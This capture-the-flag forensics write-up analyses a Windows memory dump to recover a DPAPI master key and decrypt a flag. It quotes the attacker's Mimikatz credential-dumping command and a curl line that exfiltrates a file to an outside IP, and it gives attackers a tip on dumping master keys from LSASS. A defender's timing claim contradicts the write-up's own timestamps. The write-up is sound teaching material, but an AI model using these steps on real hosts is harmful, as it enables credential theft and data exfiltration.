---
title:      "Ghost in the RAM"
platform:   "CyberGame KE"
category:   "Forensics"
difficulty: "Medium"
date:       2026-03-15
author:     "Kelvin Muhoro"

points:     350
room_url:   "https://cybergame.example/challenges/ghost-in-the-ram"
tags:       [volatility3, memory-forensics, windows, mimikatz, dpapi]
ctf:        "CyberGame KE 2026"
status:     "solved"
published:  true
tldr:       "A Windows 10 memory dump from a compromised host. The attacker dropped Mimikatz, dumped LSASS, and exfiltrated a DPAPI-protected file. Recovered the flag by reconstructing the master key from the dump and decrypting the blob."
---

## Challenge description

> An analyst captured a memory image from a suspicious workstation moments
> before the attacker burned the host. We recovered three artefacts:
>
> - `host01.raw` — full physical memory (8 GiB)
> - `secret.dpapi` — DPAPI-protected blob found on the desktop
> - A redacted incident report mentioning the user `j.muhoro`
>
> The flag is inside `secret.dpapi`. Recover it.

**Provided files:**

- `host01.raw` — Windows 10 22H2 memory image
- `secret.dpapi` — opaque DPAPI blob

## Reconnaissance

First sanity-check the image — make sure it's actually Windows and grab a
profile for Volatility 3.

```console
$ file host01.raw
host01.raw: data
$ ls -lh host01.raw secret.dpapi
-rw-r--r-- 1 kelvin kelvin 8.0G Mar 15 09:14 host01.raw
-rw-r--r-- 1 kelvin kelvin  364 Mar 15 09:14 secret.dpapi
```

Volatility 3 auto-detects the kernel symbols, so we just point it at the
image and ask for an `info` summary.

```console
$ vol -f host01.raw windows.info
Volatility 3 Framework 2.7.0

Variable             Value
Kernel Base          0xf80244e00000
DTB                  0x1aa000
Symbols              file:///.../symbols/windows/ntkrnlmp.pdb/...
Is64Bit              True
IsPAE                False
NTBuildLab           19041.2486.amd64fre.vb_release.191206-1406
NtMajorVersion       10
NtMinorVersion       0
SystemTime           2026-03-15 09:09:42
```

Good — Windows 10, 64-bit, captured right around the incident time.

## Enumeration

### Running processes

```console
$ vol -f host01.raw windows.pslist | head -n 20
PID    PPID   ImageFileName        CreateTime
4      0      System               2026-03-15 08:42:11
324    4      smss.exe             2026-03-15 08:42:13
512    488    csrss.exe            2026-03-15 08:42:18
612    488    wininit.exe          2026-03-15 08:42:18
704    612    services.exe         2026-03-15 08:42:19
712    612    lsass.exe            2026-03-15 08:42:19
1840   712    svchost.exe          2026-03-15 08:42:23
3120   2104   explorer.exe         2026-03-15 08:44:01
4012   3120   powershell.exe       2026-03-15 09:01:42
4216   4012   mimi.exe             2026-03-15 09:07:55  ← suspicious
4404   4012   curl.exe             2026-03-15 09:08:31
```

`mimi.exe` spawned from `powershell.exe` six minutes before the dump. Almost
certainly Mimikatz. Let's confirm.

### Pulling the suspicious binary

```console
$ vol -f host01.raw windows.dumpfiles --pid 4216 --dump-dir ./out
Cache         FileObject      FileName            Result
DataSectionObject 0xc0813a1...  mimi.exe          OK: out/mimi.exe.img

$ file out/mimi.exe.img
out/mimi.exe.img: PE32+ executable (console) x86-64, for MS Windows
$ sha256sum out/mimi.exe.img
31a3baf38ac72c87f6f6f6e5e88d8d2a3b2bd8c3a01d0a59c4f02e3eb3e30ed3  out/mimi.exe.img
```

VirusTotal flags that hash as `mimikatz 2.2.0 20220919`. Confirmed.

### Command-line history

PowerShell command-line buffers live in `conhost.exe`'s memory.

```console
$ vol -f host01.raw windows.cmdline | grep -iE 'powershell|mimi|curl'
4012  powershell.exe   "powershell.exe"
4216  mimi.exe         mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
4404  curl.exe         curl -X POST -F "f=@C:\Users\j.muhoro\Desktop\secret.dpapi" http://198.51.100.42:8080/up
```

So the attacker:

1. Elevated to debug privilege.
2. Dumped LSASS credentials via Mimikatz.
3. Exfiltrated `secret.dpapi` to `198.51.100.42`.

But they only exfiltrated the **ciphertext**. To read it we need the user's
**DPAPI master key**.

## Exploitation

### Step 1 — extract Mimikatz output from memory

Mimikatz prints to console; that output is buffered by `conhost.exe`.

```console
$ vol -f host01.raw windows.consoles | tee consoles.txt
PID   Process       Console Buffer
1928  conhost.exe   mimikatz # privilege::debug
                    Privilege '20' OK
                    mimikatz # sekurlsa::logonpasswords
                    Authentication Id : 0 ; 412377 (00000000:00064b59)
                    Session           : Interactive from 1
                    User Name         : j.muhoro
                    Domain            : HOST01
                    Logon Server      : HOST01
                    Logon Time        : 2026-03-15 08:44:00
                    SID               : S-1-5-21-1107...-1001
                    msv :
                     [00000003] Primary
                     * Username : j.muhoro
                     * Domain   : HOST01
                     * NTLM     : 92937945b518814341de3f726500d4ff
                     * SHA1     : a96f9e7e3431...
```

So the user's NT hash is `92937945b518814341de3f726500d4ff`. Cracking it is
the long road. The faster path is the **DPAPI master key**.

### Step 2 — recover the DPAPI master key

Volatility 3's `windows.dpapi.masterkeys` plugin walks LSASS memory and
extracts decrypted master keys from logged-on user sessions.

```console
$ vol -f host01.raw windows.dpapi.masterkeys
User          Guid                                  Sha1Key
j.muhoro      f9a1c0d2-3e4f-4a85-9d8a-2f1e0c4b6d77  3b4e57c6d2af68b1e9c0d3a8f1c4e7d2b5a8c1d4
j.muhoro      94c8b1d0-5e2f-4d7a-8c3b-1f0e9d8c7b6a  e2d1c0b9a8f7e6d5c4b3a2e1d0c9b8a7e6d5c4b3
```

Two keys are decrypted in memory. Save them.

```console
$ vol -f host01.raw windows.dpapi.masterkeys --dump-dir ./mk
Wrote 2 master keys to ./mk/

$ ls mk/
f9a1c0d2-3e4f-4a85-9d8a-2f1e0c4b6d77.key
94c8b1d0-5e2f-4d7a-8c3b-1f0e9d8c7b6a.key
```

### Step 3 — decrypt the blob

The DPAPI blob carries the GUID of the master key that protects it in its
header. A quick `hexdump` reveals it:

```console
$ xxd secret.dpapi | head -n 4
00000000: 0100 0000 d08c 9ddf 0115 d111 8c7a 00c0  .............z..
00000010: 4fc2 97eb f9a1 c0d2 3e4f 4a85 9d8a 2f1e  O.......>OJ.../.
00000020: 0c4b 6d77 8a31 b5e1 6a4f 9e0d 1c2b 7c83  .Kmw.1..jO...+|.
```

The bytes at offset `0x18` match `f9a1c0d2-3e4f-4a85-9d8a-2f1e0c4b6d77` —
the first master key.

Decrypt with `impacket-dpapi`:

```bash
impacket-dpapi unprotect \
    -file secret.dpapi \
    -masterkey "$(xxd -p -c 1024 mk/f9a1c0d2-3e4f-4a85-9d8a-2f1e0c4b6d77.key)"
```

```console
Impacket v0.12.0.dev1+20260101 - Copyright Fortra, LLC

[*] Master Key Sha1: 3b4e57c6d2af68b1e9c0d3a8f1c4e7d2b5a8c1d4
[*] Decrypted bytes:
flag{m3m0ry_n3v3r_fully_d1es_unt1l_y0u_p0w3r_0ff}
```

The flag is in plaintext inside the decrypted blob.

### Gotchas

- The first time I ran `windows.dpapi.masterkeys` it returned zero keys.
  That was because I had the wrong symbol table — the auto-download chose an
  old `ntkrnlmp.pdb`. Forcing `--single-location file://./symbols/...`
  fixed it.
- `impacket-dpapi` expects the master key **as a hex string without
  newlines**. Use `xxd -p -c 1024`; plain `xxd -p` will fold lines and the
  tool will reject the input with `binascii.Error: Non-hexadecimal digit`.

## Flag

```text
flag{m3m0ry_n3v3r_fully_d1es_unt1l_y0u_p0w3r_0ff}
```

## Lessons learned

- **For attackers** — DPAPI exfil without the master key is a paperweight.
  If you're going to steal a blob from a live host, also grab the matching
  `.../Microsoft/Protect/<SID>/<GUID>` key, or just dump it from LSASS
  while you're already there.
- **For defenders** — Mimikatz parent-of-`powershell.exe`-of-`explorer.exe`
  is a classic kill chain. A simple Sysmon rule on `ParentImage =
  powershell.exe AND Image not in allowlist` would have caught
  `mimi.exe` at `09:07:55`, twenty-five minutes before the analyst pulled
  the dump.
- **For me** — always verify the Volatility 3 symbol table before believing
  an empty plugin result.

## References

- [Volatility 3 — `windows.dpapi.masterkeys`](https://volatility3.readthedocs.io/en/latest/volatility3.framework.plugins.windows.dpapi.html)
- [Impacket `dpapi.py`](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)
- [DPAPI blob format](https://learn.microsoft.com/en-us/windows/win32/seccrypto/protected-data-format)
- [Mimikatz `sekurlsa` module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
